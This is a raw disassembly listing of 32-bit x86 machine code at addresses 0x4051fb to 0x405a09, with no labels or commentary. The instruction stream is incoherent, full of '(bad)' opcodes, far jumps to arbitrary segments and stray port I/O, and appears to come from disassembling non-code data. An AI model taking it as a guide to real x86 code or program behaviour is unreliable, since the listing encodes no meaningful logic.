  4051fb:	adc    eax,DWORD PTR [esi]
  4051fd:	dec    ebx
  4051fe:	dec    esi
  4051ff:	jp     0x4051d6
  405201:	repnz inc eax
  405203:	fcomp  QWORD PTR [edx-0x2b9a6297]
  405209:	and    ebx,edi
  40520b:	add    eax,0x49fc9a48
  405210:	cmp    BYTE PTR [ebx+ebp*2-0x19],al
  405214:	(bad)  
  405216:	push   ecx
  405217:	stos   BYTE PTR es:[edi],al
  405218:	xor    al,bl
  40521a:	sub    eax,0x7d00956c
  40521f:	mov    al,ds:0xb04793df
  405224:	pop    eax
  405225:	or     esp,0x75
  405228:	call   0xb77e:0x4bb0188e
  40522f:	xchg   ebx,eax
  405230:	xchg   esi,eax
  405231:	int3   
  405232:	jp     0x4052ac
  405234:	int    0xa3
  405236:	lsl    ecx,WORD PTR [esi]
  405239:	inc    esp
  40523a:	mov    ds:0xed498263,eax
  40523f:	data16 add bl,dh
  405242:	test   eax,0x7c4258b6
  405247:	out    0x35,al
  405249:	add    esp,DWORD PTR [ebx+ebx*8]
  40524c:	or     BYTE PTR [ebx+0x55449aca],ah
  405252:	mov    esi,0xc854d79
  405257:	daa    
  405258:	loopne 0x4052a3
  40525a:	xchg   esi,eax
  40525b:	dec    edi
  40525c:	inc    eax
  40525d:	gs nop
  40525f:	clc    
  405260:	(bad)  
  405261:	cmp    DWORD PTR [edx-0x35813db5],esp
  405267:	daa    
  405268:	pop    ds
  405269:	repnz sti 
  40526b:	call   0x637:0x8ef2ac39
  405272:	xchg   esi,eax
  405273:	jb     0x40521f
  405275:	popf   
  405276:	jmp    0x3e42:0x1aa267aa
  40527d:	mov    ah,cl
  40527f:	stos   BYTE PTR es:[edi],al
  405280:	xor    DWORD PTR [edi-0x616a61b2],esi
  405286:	adc    ch,BYTE PTR [ebx]
  405288:	cmp    dh,BYTE PTR [edi-0x61]
  40528b:	and    DWORD PTR [esi+0x31],edi
  40528e:	fdivr  QWORD PTR [ecx]
  405290:	and    esp,esp
  405292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405293:	data16 int3 
  405295:	sti    
  405296:	leave  
  405297:	lock (bad) 
  405299:	idiv   BYTE PTR [edx+0x14646e4e]
  40529f:	dec    ecx
  4052a0:	jmp    0x20930e96
  4052a5:	test   DWORD PTR [esi],esi
  4052a7:	add    al,0x94
  4052a9:	sbb    eax,0x85fdafbd
  4052ae:	inc    eax
  4052af:	mov    esp,0xd9deade2
  4052b4:	xchg   ebx,eax
  4052b5:	push   es
  4052b6:	xor    esp,DWORD PTR [ebx-0x1e]
  4052b9:	jmp    0x995f:0x8ecfda13
  4052c0:	sub    al,0x99
  4052c2:	fild   QWORD PTR [ebp-0xe]
  4052c5:	pop    esp
  4052c6:	test   edx,esi
  4052c8:	into   
  4052c9:	dec    ebp
  4052ca:	jb     0x405277
  4052cc:	les    ebx,FWORD PTR [edx+edi*8]
  4052cf:	mov    dh,0x38
  4052d1:	xchg   ecx,eax
  4052d2:	ins    BYTE PTR es:[edi],dx
  4052d3:	or     bh,bh
  4052d5:	gs mov bh,0x6b
  4052d8:	cmp    bl,BYTE PTR [edi+0x6d22afdb]
  4052de:	scas   eax,DWORD PTR es:[edi]
  4052df:	cmp    al,0x51
  4052e1:	aad    0x13
  4052e3:	pusha  
  4052e4:	(bad)  
  4052e5:	fwait
  4052e6:	mov    edx,esi
  4052e8:	outs   dx,DWORD PTR ds:[esi]
  4052e9:	ja     0x405291
  4052eb:	sub    BYTE PTR [eax+0x7c],cl
  4052ee:	dec    eax
  4052ef:	daa    
  4052f0:	ins    DWORD PTR es:[edi],dx
  4052f1:	std    
  4052f2:	xchg   ebp,eax
  4052f3:	push   ebp
  4052f4:	mov    WORD PTR ds:0xbea3ef4e,gs
  4052fa:	(bad)  ds:0xc2230d49
  405300:	pop    eax
  405301:	inc    eax
  405302:	call   0xa5cd:0x66844006
  405309:	adc    edi,edx
  40530b:	mov    al,0x92
  40530d:	jmp    0xb65d:0xe34ba637
  405314:	out    0x5d,al
  405316:	dec    ecx
  405317:	adc    BYTE PTR [ecx-0x1b],al
  40531a:	push   ebx
  40531b:	pop    ebx
  40531c:	and    eax,0xc608e5f5
  405321:	sbb    bh,BYTE PTR [eax-0x7a]
  405324:	test   BYTE PTR [ecx+ebx*4-0x58],ch
  405328:	dec    esp
  405329:	iret   
  40532a:	push   ecx
  40532b:	mov    dl,0xab
  40532d:	xor    al,0x30
  40532f:	dec    ecx
  405330:	push   es
  405331:	cli    
  405332:	or     eax,0xa7fed571
  405337:	fs stc 
  405339:	xor    edi,0xf62408f1
  40533f:	jb     0x40535c
  405341:	sub    BYTE PTR [ecx],al
  405343:	xor    BYTE PTR [edx+0x2518f603],al
  405349:	outs   dx,DWORD PTR ds:[esi]
  40534a:	push   0x75bcf7c9
  40534f:	jecxz  0x4052e8
  405351:	cs mov bh,0x74
  405354:	(bad)  [ecx+0x689bd61e]
  40535a:	mov    eax,0x2577cb8
  40535f:	xor    edx,0x2cdf44d7
  405365:	add    bh,BYTE PTR [ecx+0x27d12e64]
  40536b:	adc    DWORD PTR [ebx],edx
  40536d:	aaa    
  40536e:	push   edi
  40536f:	fs dec eax
  405371:	mov    edi,0xed96461
  405376:	pushf  
  405377:	rol    BYTE PTR [ebx],0x5
  40537a:	popf   
  40537b:	data16 sbb BYTE PTR [esi],dh
  40537e:	outs   dx,BYTE PTR ds:[esi]
  40537f:	sti    
  405380:	sub    ebx,DWORD PTR es:[esi-0x2e]
  405384:	clc    
  405385:	jne    0x40531a
  405387:	call   0x2bcb4a3f
  40538c:	stos   DWORD PTR es:[edi],eax
  40538d:	paddq  mm3,QWORD PTR [edi-0x7]
  405391:	inc    ebp
  405392:	in     al,dx
  405393:	fcomp  st(0)
  405395:	jo     0x4053a4
  405397:	shr    BYTE PTR [edi-0x3032c7d1],1
  40539d:	cmp    DWORD PTR [eax-0x75],eax
  4053a0:	and    BYTE PTR ds:0x605d849c,dl
  4053a6:	test   eax,edi
  4053a8:	in     al,0x4c
  4053aa:	jecxz  0x405426
  4053ac:	pushf  
  4053ad:	mov    eax,ds:0x159c2d94
  4053b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053b3:	rcl    eax,1
  4053b5:	lea    esi,[edi]
  4053b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053b8:	xor    BYTE PTR [esi],dh
  4053ba:	fs jmp 0x977f:0x31b0fffe
  4053c2:	pop    edi
  4053c3:	dec    edx
  4053c4:	stos   DWORD PTR es:[edi],eax
  4053c5:	push   edi
  4053c6:	inc    edx
  4053c7:	mov    al,ds:0xa358ef22
  4053cc:	loop   0x405421
  4053ce:	scas   al,BYTE PTR es:[edi]
  4053cf:	lods   eax,DWORD PTR ds:[esi]
  4053d0:	push   ebp
  4053d1:	inc    edx
  4053d2:	mov    ds:0xa1f1f236,al
  4053d7:	ss jnp 0x405434
  4053da:	xor    ebx,ebp
  4053dc:	inc    ecx
  4053dd:	fwait
  4053de:	aas    
  4053df:	jns    0x40541f
  4053e1:	mov    ebp,0x18150cc6
  4053e6:	mov    al,ds:0xc6be07e0
  4053eb:	call   0x8a14:0x1b21edcb
  4053f2:	xchg   ecx,eax
  4053f3:	mov    esp,0x911098b6
  4053f8:	jecxz  0x4053e7
  4053fa:	mov    edx,0xfe9cac10
  4053ff:	jp     0x405456
  405401:	and    DWORD PTR [edx-0x45],0xb2953a1c
  405408:	add    eax,0x29927703
  40540d:	pop    ecx
  40540e:	sbb    ebp,DWORD PTR [edx+esi*2]
  405411:	iret   
  405412:	add    cl,bl
  405414:	mov    eax,DWORD PTR [ebx-0x4a4b1f48]
  40541a:	ror    BYTE PTR [eax-0x58d685e9],1
  405420:	inc    ebx
  405421:	add    eax,edx
  405423:	add    al,0xb6
  405425:	loope  0x405453
  405427:	sub    al,0x27
  405429:	jle    0x4053e5
  40542b:	call   0xe540f03e
  405430:	inc    ebp
  405431:	out    0x2,eax
  405433:	lods   al,BYTE PTR ds:[esi]
  405434:	std    
  405435:	or     DWORD PTR [ecx+0x4c],edx
  405438:	or     al,0xb9
  40543a:	pop    edi
  40543b:	in     al,0xf2
  40543d:	pop    DWORD PTR [edi+eiz*8-0x3d5ca707]
  405444:	adc    DWORD PTR [ecx],edx
  405446:	mov    ecx,0x48048f93
  40544b:	ss jns 0x405415
  40544e:	cmp    eax,0x4a276b2a
  405453:	add    esp,DWORD PTR [edx]
  405455:	dec    edx
  405456:	addr16 jle 0x405402
  405459:	and    esi,ecx
  40545b:	fldenv [eiz*2+0x650e8aa3]
  405462:	jge    0x405469
  405464:	xor    DWORD PTR [ecx+0xcdf432e],ebx
  40546a:	dec    eax
  40546b:	xchg   ecx,eax
  40546c:	xor    eax,0xee54d50a
  405471:	pop    edx
  405472:	add    ch,dl
  405474:	(bad)  
  405475:	out    0xb,eax
  405477:	mov    eax,0xbccdb952
  40547c:	ins    DWORD PTR es:[edi],dx
  40547d:	or     eax,0x9b362c47
  405482:	and    BYTE PTR [ebx+0x7b],0x72
  405486:	mov    cl,0xd5
  405488:	lods   al,BYTE PTR es:[esi]
  40548a:	daa    
  40548b:	shl    DWORD PTR [ecx],0xd7
  40548e:	push   edx
  40548f:	inc    esp
  405490:	inc    esp
  405491:	cmc    
  405492:	call   0x3ff9:0xbdd4d5ef
  405499:	xor    al,0x59
  40549b:	into   
  40549c:	je     0x40548c
  40549e:	push   esi
  40549f:	aas    
  4054a0:	leave  
  4054a1:	push   ds
  4054a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054a3:	retf   0x391
  4054a6:	enter  0x64bd,0x83
  4054aa:	jg     0x405522
  4054ac:	das    
  4054ad:	and    ebx,ebx
  4054af:	sub    DWORD PTR [ebx+0x1f8c53e4],edx
  4054b5:	sub    esp,DWORD PTR [ecx]
  4054b7:	add    ebp,DWORD PTR [edi+ecx*8+0xd]
  4054bb:	mov    bh,0x2d
  4054bd:	inc    edi
  4054be:	cdq    
  4054bf:	adc    al,0xb0
  4054c1:	mov    ch,0x82
  4054c3:	popa   
  4054c4:	pop    ds
  4054c5:	call   0x2c94:0x75a770ff
  4054cc:	fst    QWORD PTR [ecx+0x6a1adbe6]
  4054d2:	mov    ah,0xaa
  4054d4:	pop    es
  4054d5:	jle    0x4054a1
  4054d7:	and    al,0x57
  4054d9:	sti    
  4054da:	jle    0x405528
  4054dc:	ror    DWORD PTR [edi+eiz*4-0x6e54fca3],0x74
  4054e4:	xchg   ebp,eax
  4054e5:	repz pop edx
  4054e7:	xchg   ebp,eax
  4054e8:	dec    esi
  4054e9:	(bad)  
  4054ea:	(bad)  
  4054ec:	jmp    DWORD PTR [eax+0x26]
  4054ef:	dec    esi
  4054f0:	popf   
  4054f1:	loope  0x40551c
  4054f3:	jecxz  0x40549f
  4054f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054f6:	or     DWORD PTR [eax-0x36],ebx
  4054f9:	call   0xa155:0x81904042
  405500:	in     eax,0xb2
  405502:	dec    esi
  405503:	aad    0xdb
  405505:	pop    es
  405506:	mov    al,ds:0x80153fa
  40550b:	xchg   edx,eax
  40550c:	jecxz  0x405531
  40550e:	(bad)  
  40550f:	xor    al,0x44
  405511:	aas    
  405512:	sub    DWORD PTR [ecx],0x2049ff88
  405518:	mov    dl,BYTE PTR [ebp-0x2ce1a600]
  40551e:	aaa    
  40551f:	rcr    DWORD PTR [edi+0x78930972],cl
  405525:	sbb    BYTE PTR [ebx],0x83
  405528:	aas    
  405529:	cs ss jmp 0x40c1ac8f
  405530:	shl    BYTE PTR [edi-0x5e],cl
  405533:	aas    
  405534:	adc    al,BYTE PTR [esp+ebx*4]
  405537:	sbb    DWORD PTR [ecx-0x395149d],0x26
  40553e:	aam    0x51
  405540:	push   edi
  405541:	dec    eax
  405543:	mov    ecx,eax
  405545:	daa    
  405546:	es inc ecx
  405548:	add    DWORD PTR [ebx+edx*2-0x3e798232],0xffffff81
  405550:	inc    edi
  405551:	cmp    BYTE PTR [ebx+0x66],al
  405554:	out    dx,al
  405555:	xchg   bl,ch
  405557:	jmp    0xf586:0xfb9463e8
  40555e:	lock clc 
  405560:	retf   
  405561:	push   esi
  405562:	xchg   esi,eax
  405563:	ret    0x5b1f
  405566:	fist   DWORD PTR [ecx]
  405568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405569:	fcmovb st,st(2)
  40556b:	out    dx,eax
  40556c:	add    eax,0xfc6d585e
  405571:	nop
  405572:	rcl    edi,cl
  405574:	stc    
  405575:	mov    bl,0x75
  405577:	mov    dl,0xc2
  405579:	mov    ch,BYTE PTR [ebp-0x56]
  40557c:	sti    
  40557d:	idiv   DWORD PTR [edi+ecx*1-0x5c64dca5]
  405584:	in     al,dx
  405585:	ret    
  405586:	shl    ah,0xd2
  405589:	mov    ebx,0x7bc97149
  40558e:	xchg   esp,eax
  40558f:	mov    ds:0x71139a0a,al
  405594:	push   eax
  405595:	loope  0x405578
  405597:	and    eax,DWORD PTR [edi-0x5f434d6c]
  40559d:	mov    ecx,0xbc67713c
  4055a2:	add    al,0x6d
  4055a4:	fwait
  4055a5:	repz inc esp
  4055a7:	xchg   ecx,eax
  4055a8:	add    BYTE PTR [eax-0x7acf788f],0xf8
  4055af:	(bad)  
  4055b0:	ds shr cl,cl
  4055b3:	sbb    DWORD PTR [ebx+esi*8+0x336ac8df],edi
  4055ba:	not    DWORD PTR [esi-0x30ea52d3]
  4055c0:	daa    
  4055c1:	xor    cl,dl
  4055c3:	pop    ebp
  4055c4:	cdq    
  4055c5:	inc    edx
  4055c6:	loope  0x405599
  4055c8:	lods   eax,DWORD PTR ds:[esi]
  4055c9:	mov    ds:0x23323d0e,eax
  4055ce:	icebp  
  4055cf:	mov    cs,WORD PTR [edx-0x73fe917f]
  4055d5:	popf   
  4055d6:	push   ecx
  4055d7:	push   ss
  4055d8:	(bad)  
  4055d9:	into   
  4055da:	push   edx
  4055db:	and    ah,dh
  4055dd:	dec    esi
  4055de:	pop    eax
  4055df:	jmp    0x9a4c345d
  4055e4:	retf   
  4055e5:	out    dx,al
  4055e6:	cli    
  4055e7:	jg     0x405591
  4055e9:	jecxz  0x40560d
  4055eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055ec:	sub    eax,0x2d9325e3
  4055f1:	not    BYTE PTR [eax+0x6035968e]
  4055f7:	jmp    FWORD PTR [ebp+0x53f06fe0]
  4055fd:	(bad)  
  4055fe:	loope  0x405638
  405600:	jne    0x4055dd
  405602:	gs int3 
  405604:	cld    
  405605:	fwait
  405606:	loopne 0x40559f
  405608:	das    
  405609:	loope  0x40562f
  40560b:	fcom   QWORD PTR [eax]
  40560d:	stos   BYTE PTR es:[edi],al
  40560e:	push   edx
  40560f:	loop   0x405594
  405611:	and    eax,DWORD PTR ds:0x3cd3e97d
  405617:	bound  ebx,QWORD PTR [bx+di]
  40561a:	or     DWORD PTR [eax+0x50],0xb30ac6d7
  405621:	sar    DWORD PTR [edx],cl
  405623:	shl    BYTE PTR [esi+0x22d230ce],1
  405629:	popf   
  40562a:	nop
  40562b:	add    esi,edi
  40562d:	push   0xffffffe9
  40562f:	mov    eax,ds:0x903b48b6
  405634:	hlt    
  405635:	and    DWORD PTR [edx-0x28],0xb364450c
  40563c:	jmp    0xd2b5b8d9
  405641:	mov    es,WORD PTR ds:0x674b2661
  405647:	pushf  
  405648:	iret   
  405649:	std    
  40564a:	pop    es
  40564b:	push   0xffffffa4
  40564d:	mov    eax,0xd64a937b
  405652:	cs inc esi
  405654:	mov    cl,0x94
  405656:	and    ah,cl
  405658:	pusha  
  405659:	adc    ecx,DWORD PTR [edi]
  40565b:	xor    al,0x81
  40565d:	jmp    0x32f7:0xfa9f8fc9
  405664:	es fadd st(6),st
  405667:	mov    ds:0x4687fb87,al
  40566c:	dec    edx
  40566d:	pusha  
  40566e:	inc    eax
  40566f:	xchg   ebp,eax
  405670:	cmc    
  405671:	(bad)  
  405672:	fisubr DWORD PTR [edx]
  405674:	imul   esp,DWORD PTR [ebx+ecx*4+0x72],0xee39615
  40567c:	push   ss
  40567d:	pop    eax
  40567e:	js     0x405630
  405680:	mul    DWORD PTR [eax]
  405682:	leave  
  405683:	clc    
  405684:	xor    ecx,esp
  405686:	sub    ecx,edx
  405688:	loopne 0x4056f7
  40568a:	ss inc edi
  40568c:	push   esi
  40568d:	ret    0xf0b8
  405690:	pop    edx
  405691:	inc    edx
  405692:	jnp    0x4056ee
  405694:	shl    DWORD PTR [eax],1
  405696:	mov    al,ds:0xb3fdb5d3
  40569b:	cs pop eax
  40569d:	mov    dh,0x6c
  40569f:	in     al,dx
  4056a0:	inc    edi
  4056a1:	aas    
  4056a2:	inc    esp
  4056a3:	add    al,0xb5
  4056a5:	dec    esi
  4056a6:	push   ds
  4056a7:	push   cs
  4056a8:	mov    bh,0xca
  4056aa:	xlat   BYTE PTR ds:[ebx]
  4056ab:	mov    ebx,0xa061a195
  4056b0:	les    esi,FWORD PTR [ecx]
  4056b2:	xor    eax,0x8acd336a
  4056b7:	ret    
  4056b8:	std    
  4056b9:	bound  esi,QWORD PTR [ecx+ebp*8+0x4c]
  4056bd:	dec    esp
  4056be:	add    BYTE PTR [ecx],cl
  4056c0:	xchg   BYTE PTR [ecx-0x2a2d5297],dl
  4056c6:	js     0x40565f
  4056c8:	jmp    0x4d79:0x8a33a2be
  4056cf:	clc    
  4056d0:	jmp    0x40565a
  4056d2:	repnz stos DWORD PTR es:[edi],eax
  4056d4:	xlat   BYTE PTR ds:[ebx]
  4056d5:	sbb    eax,0xf6bc8474
  4056da:	or     BYTE PTR [edi+0x5dee6468],al
  4056e0:	adc    ecx,0x54bdb414
  4056e6:	dec    edx
  4056e7:	jbe    0x405682
  4056e9:	out    dx,al
  4056ea:	push   cs
  4056eb:	mov    ch,0x63
  4056ed:	outs   dx,BYTE PTR ds:[esi]
  4056ee:	push   cs
  4056ef:	leave  
  4056f0:	add    eax,0x9953b483
  4056f5:	mov    eax,ds:0x92e32a6
  4056fa:	fld    DWORD PTR [ebx]
  4056fc:	xor    edx,ecx
  4056fe:	sahf   
  4056ff:	jmp    0x4056b6
  405701:	test   eax,0xb0b595b2
  405706:	jecxz  0x40568d
  405708:	add    eax,0x5f7dc1c0
  40570d:	iret   
  40570e:	jae    0x405727
  405710:	in     al,dx
  405711:	xchg   esi,eax
  405712:	sahf   
  405713:	rcr    BYTE PTR [esi-0x5d16007f],1
  405719:	mov    ch,0x78
  40571b:	loopne 0x4056da
  40571d:	icebp  
  40571e:	adc    ebx,edi
  405720:	mov    eax,0x67c75149
  405725:	xchg   ebx,eax
  405726:	xchg   DWORD PTR [edi],ecx
  405728:	mov    gs,WORD PTR [eax+0x61]
  40572b:	add    esp,DWORD PTR [edx-0x27525536]
  405731:	push   esp
  405732:	rcl    BYTE PTR [eax],1
  405734:	or     si,WORD PTR [edi]
  405737:	or     al,al
  405739:	jb     0x4057a6
  40573b:	push   0xffffffed
  40573d:	mov    ecx,DWORD PTR [edx+0x7b1bff5a]
  405743:	add    DWORD PTR [esi],ebx
  405745:	jno    0x4056f2
  405747:	sbb    esp,eax
  405749:	and    DWORD PTR [ebx],ecx
  40574b:	xchg   esp,eax
  40574c:	push   edx
  40574d:	popf   
  40574e:	jns    0x4057ab
  405750:	sahf   
  405751:	aaa    
  405752:	inc    ebx
  405753:	ret    
  405754:	jne    0x405749
  405756:	or     DWORD PTR [ebx],ecx
  405758:	stos   BYTE PTR es:[edi],al
  405759:	out    0xe3,al
  40575b:	adc    eax,0x9ba167ea
  405760:	pop    ds
  405761:	sub    BYTE PTR [edi],0x19
  405764:	dec    esi
  405765:	pop    edx
  405766:	out    0xb3,eax
  405768:	test   eax,ebx
  40576a:	cli    
  40576b:	je     0x40579b
  40576d:	push   ecx
  40576e:	into   
  40576f:	(bad)  
  405770:	jg     0x405717
  405772:	add    eax,0xe67f037c
  405777:	cmp    al,BYTE PTR [esi+0x56]
  40577a:	jg     0x4057ac
  40577c:	(bad)  
  40577d:	icebp  
  40577e:	adc    BYTE PTR [edi-0x7a3293ce],dl
  405784:	retf   0xd057
  405787:	enter  0xe60,0x9b
  40578b:	mov    ecx,0x556839a6
  405790:	(bad)  
  405791:	fisttp DWORD PTR [ecx+0x45]
  405794:	das    
  405795:	retf   
  405796:	mov    al,0xfe
  405798:	call   FWORD PTR [eax-0x7ff042e0]
  40579e:	ins    BYTE PTR es:[edi],dx
  40579f:	into   
  4057a0:	pop    edx
  4057a1:	xor    cl,BYTE PTR [ecx+edx*2+0x1f]
  4057a5:	dec    ecx
  4057a6:	jo     0x4057c2
  4057a8:	cmp    BYTE PTR [edx],al
  4057aa:	lods   eax,DWORD PTR ds:[esi]
  4057ab:	mov    ebp,0x791c14e9
  4057b0:	jo     0x4057db
  4057b2:	push   ebx
  4057b3:	loope  0x405770
  4057b5:	mov    eax,0xd625285b
  4057ba:	dec    edx
  4057bb:	into   
  4057bc:	lahf   
  4057bd:	push   ebx
  4057be:	bound  ebp,QWORD PTR ds:0x2b41a38e
  4057c4:	sub    al,0xc7
  4057c6:	fimul  DWORD PTR [ebx+0x30]
  4057c9:	mov    ds:0x129d6976,eax
  4057ce:	xchg   ebp,eax
  4057cf:	push   cs
  4057d0:	sub    al,BYTE PTR [ebx-0x6852f365]
  4057d6:	nop
  4057d7:	or     BYTE PTR [edx-0x5d],bl
  4057da:	jno    0x405811
  4057dc:	fsubr  st,st(1)
  4057de:	scas   eax,DWORD PTR es:[edi]
  4057df:	dec    esp
  4057e0:	mov    ds:0xd868e1cb,al
  4057e5:	repnz mov BYTE PTR [ecx+0x2c],0x67
  4057ea:	push   ebp
  4057eb:	fwait
  4057ec:	test   eax,0x18046359
  4057f1:	fbld   TBYTE PTR [ebp+edx*2+0x58b9d7ca]
  4057f8:	call   0xab4:0xa435d0c5
  4057ff:	mov    ss,WORD PTR [esi+0xb]
  405802:	test   BYTE PTR [ebx-0x77],cl
  405805:	enter  0xc661,0x36
  405809:	push   0x8ba49dcb
  40580e:	push   ss
  40580f:	push   es
  405810:	cmc    
  405811:	dec    esp
  405812:	les    edi,FWORD PTR [edi-0x3e86ae34]
  405818:	push   edx
  405819:	xlat   BYTE PTR ds:[ebx]
  40581a:	lea    esi,ds:0xee77305b
  405820:	call   0x709da1ee
  405825:	addr16 and eax,0x6ab24f3
  40582b:	nop
  40582c:	and    esi,DWORD PTR [edi-0x4485e3d6]
  405832:	xor    BYTE PTR [eax-0x64],0xa1
  405836:	mov    ds:0x79b32d9b,eax
  40583b:	mov    esi,0xcd0f4fe0
  405840:	jmp    0xf778:0x4234cc53
  405847:	or     DWORD PTR cs:[edx+0x74],esp
  40584b:	jecxz  0x4057fa
  40584d:	sbb    ebp,DWORD PTR [edi-0x351f9007]
  405853:	xchg   bl,cl
  405855:	div    DWORD PTR [edi]
  405857:	daa    
  405858:	retf   
  405859:	dec    esi
  40585a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40585b:	int    0x70
  40585d:	mov    dl,0x71
  40585f:	dec    ebp
  405860:	jnp    0x40585a
  405862:	iret   
  405863:	out    0xc1,al
  405865:	or     DWORD PTR [ebx*8+0x8a297df],ebx
  40586c:	(bad)  
  40586d:	adc    eax,0x6755b5a6
  405872:	inc    ecx
  405873:	out    0x53,eax
  405875:	pop    ds
  405876:	daa    
  405877:	sub    eax,0x115d8c83
  40587c:	pop    es
  40587d:	int    0xaa
  40587f:	(bad)  
  405880:	mov    eax,ds:0xe3a9980a
  405885:	retf   0x1923
  405888:	pusha  
  405889:	scas   eax,DWORD PTR es:[edi]
  40588a:	adc    BYTE PTR [edx-0x70],cl
  40588d:	mov    BYTE PTR [esi],dl
  40588f:	out    dx,al
  405890:	jns    0x40589d
  405892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405893:	mov    eax,0xbd4c93fd
  405898:	and    dl,bl
  40589a:	or     BYTE PTR [ebx],0x57
  40589d:	mov    cl,0x33
  40589f:	lock xor al,0x9f
  4058a2:	in     eax,0xef
  4058a4:	std    
  4058a5:	jb     0x405896
  4058a7:	push   0xffffff87
  4058a9:	push   es
  4058aa:	mul    edi
  4058ac:	pop    esi
  4058ad:	add    al,0x77
  4058af:	xchg   ebx,eax
  4058b0:	mov    bh,0x2b
  4058b2:	mov    fs,WORD PTR [ebx+0xa36a06c]
  4058b8:	enter  0xed06,0x55
  4058bc:	fcomip st,st(7)
  4058be:	(bad)
  4058c2:	lods   al,BYTE PTR ds:[esi]
  4058c3:	push   ss
  4058c4:	push   ds
  4058c5:	cmp    DWORD PTR [ecx+0x3e],esi
  4058c8:	or     DWORD PTR [ebp-0x27],eax
  4058cb:	je     0x40593f
  4058cd:	fadd   QWORD PTR [edx-0x72]
  4058d0:	pushf  
  4058d1:	add    dh,BYTE PTR [ecx-0x1b]
  4058d4:	cmp    edi,DWORD PTR [ebx]
  4058d6:	pushf  
  4058d7:	rcl    DWORD PTR ds:0xb374e9a1,cl
  4058dd:	xor    eax,0xcb1ce733
  4058e2:	lods   eax,DWORD PTR ds:[esi]
  4058e3:	dec    esi
  4058e4:	call   0xdf5:0x64f39b77
  4058eb:	inc    ecx
  4058ec:	push   esi
  4058ed:	out    0xea,al
  4058ef:	test   eax,0x3728a619
  4058f4:	lods   eax,DWORD PTR ds:[esi]
  4058f5:	in     al,0xd4
  4058f7:	ror    al,1
  4058f9:	outs   dx,BYTE PTR ds:[esi]
  4058fa:	xchg   esp,eax
  4058fb:	rol    DWORD PTR [eax-0x35],cl
  4058fe:	pop    edx
  4058ff:	cs dec eax
  405901:	sbb    BYTE PTR [eax+0x9c34b31],al
  405907:	test   al,0xb6
  405909:	xor    DWORD PTR [ecx+0x410bb3ee],esp
  40590f:	mov    eax,ds:0xf7bc865c
  405914:	adc    BYTE PTR [esi],dh
  405916:	jge    0x405918
  405918:	cmp    BYTE PTR [edx+0x7e],al
  40591b:	stc    
  40591c:	mov    BYTE PTR [ebp+ebp*8+0x1f],cl
  405920:	dec    esi
  405921:	pop    eax
  405922:	pop    ds
  405923:	xchg   edi,eax
  405924:	xor    edx,edi
  405926:	sub    BYTE PTR [ecx],dh
  405928:	mov    ch,0xd6
  40592a:	push   ebx
  40592b:	xchg   edx,eax
  40592c:	jmp    0x8315afa7
  405931:	sub    eax,0x4fdb54ee
  405936:	push   eax
  405937:	pop    esi
  405938:	and    al,0xa8
  40593a:	fs (bad) 
  40593c:	jne    0x4059a8
  40593e:	mov    eax,ds:0x9388308d
  405943:	hlt    
  405944:	or     dh,BYTE PTR [ebp-0x5b]
  405947:	pop    ebp
  405948:	cld    
  405949:	rol    cl,1
  40594b:	dec    ebx
  40594c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40594d:	rol    BYTE PTR [ebp-0x74],1
  405950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405951:	dec    esp
  405952:	mov    ebx,0x4de6b1b8
  405957:	and    al,0x33
  405959:	clc    
  40595a:	popf   
  40595b:	and    ecx,DWORD PTR [ebp-0x5c]
  40595e:	out    dx,eax
  40595f:	out    dx,eax
  405960:	pop    esi
  405961:	test   eax,0x755e66d0
  405966:	call   0x10:0x63da84a8
  40596d:	rcl    DWORD PTR [esi+edi*1+0x4a4054bc],1
  405974:	out    dx,al
  405975:	jg     0x40594d
  405977:	jge    0x4059b6
  405979:	pop    esi
  40597a:	pushf  
  40597b:	idiv   BYTE PTR [edx+0x79]
  40597e:	or     DWORD PTR [ebx+0x65851f47],esi
  405984:	mov    ah,0x18
  405986:	xchg   ebx,eax
  405987:	mov    ds:0xf774691b,eax
  40598c:	imul   esp,DWORD PTR [eax-0x42],0x9300e306
  405993:	push   edi
  405994:	cld    
  405995:	mov    ecx,0x591e243c
  40599a:	mov    ah,0x85
  40599c:	ds jmp 0xe0f4:0x2cee2bdd
  4059a4:	stc    
  4059a5:	dec    eax
  4059a6:	mov    bl,0x25
  4059a8:	jecxz  0x4059c8
  4059aa:	ins    DWORD PTR es:[edi],dx
  4059ab:	pop    edi
  4059ac:	xlat   BYTE PTR ds:[ebx]
  4059ad:	adc    eax,0x9531e8bc
  4059b2:	cmp    edi,DWORD PTR ds:0x872
  4059b7:	pop    esi
  4059b8:	hlt    
  4059b9:	jp     0x40598b
  4059bb:	or     dh,bl
  4059bd:	(bad)  
  4059be:	adc    BYTE PTR [ebp-0x70],ah
  4059c1:	(bad)  
  4059c2:	push   ebp
  4059c3:	xchg   dl,ch
  4059c5:	out    0xb5,eax
  4059c7:	outs   dx,DWORD PTR ds:[esi]
  4059c8:	push   edx
  4059c9:	and    bh,BYTE PTR [ecx]
  4059cb:	push   ds
  4059cc:	or     BYTE PTR [edx-0x2c],0xc8
  4059d0:	jno    0x405a00
  4059d2:	sub    ebx,DWORD PTR [esi]
  4059d4:	into   
  4059d5:	fimul  DWORD PTR [ebx]
  4059d7:	push   ebp
  4059d8:	inc    esi
  4059d9:	sbb    bh,al
  4059db:	jmp    0xad7423ad
  4059e0:	sbb    WORD PTR [ebp+0x73],si
  4059e4:	and    esp,DWORD PTR [ecx]
  4059e6:	out    0x7e,al
  4059e8:	push   0xbea8ddc2
  4059ed:	aaa    
  4059ee:	popf   
  4059ef:	add    esi,DWORD PTR [edx-0x30]
  4059f2:	into   
  4059f3:	ficomp WORD PTR [esi]
  4059f5:	push   cs
  4059f6:	sbb    DWORD PTR [edi+0x4],esi
  4059f9:	aad    0x11
  4059fb:	fidivr WORD PTR [ecx-0x50704b31]
  405a01:	test   BYTE PTR [edi+0x58],dh
  405a04:	xchg   esp,eax
  405a05:	je     0x405a17
  405a07:	adc    bl,bh
  405a09:	ins    BYTE PTR es:[edi],dx
